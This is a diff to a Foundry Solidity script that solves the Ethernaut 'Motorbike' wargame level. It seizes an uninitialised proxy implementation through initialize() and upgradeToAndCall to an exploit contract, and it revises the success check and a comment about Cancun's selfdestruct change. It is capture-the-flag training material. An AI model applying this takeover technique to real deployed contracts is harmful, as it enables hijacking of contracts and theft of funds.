@@ -8,6 +8,7 @@ contract Level25Script is Script {
     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
 
     function run() public {
+        // NOTE: After the cancun upgrade, the selfdestruct does not remove the code from the contract.
         VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));
 
         address payable contractAddress = payable(vm.envAddress("CONTRACT"));
@@ -16,7 +17,6 @@ contract Level25Script is Script {
         exploit(contractAddress);
         vm.stopBroadcast();
 
-        // Since cancun upgrade, I think this level has no solution
         require(levelDone(contractAddress), "Solution failed");
     }
 
@@ -25,17 +25,17 @@ contract Level25Script is Script {
         Engine engine = Engine(implementation);
         engine.initialize();
         MotorbikeExploit e = new MotorbikeExploit();
-        console.log("EXPLOIT ADDRESS", address(e));
         engine.upgradeToAndCall(address(e), abi.encodeWithSignature("exploit()"));
     }
 
     function levelDone(address _target) private returns (bool) {
-        (bool ok,) = address(_target).call(abi.encodeWithSignature("horsePower()"));
-        return !ok;
+        address implementation = address(uint160(uint256(vm.load(_target, _IMPLEMENTATION_SLOT))));
+        return Engine(implementation).horsePower() == 0xdead;
     }
 }
 
 interface Engine {
+    function horsePower() external returns (uint256);
     function initialize() external;
     function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
 }
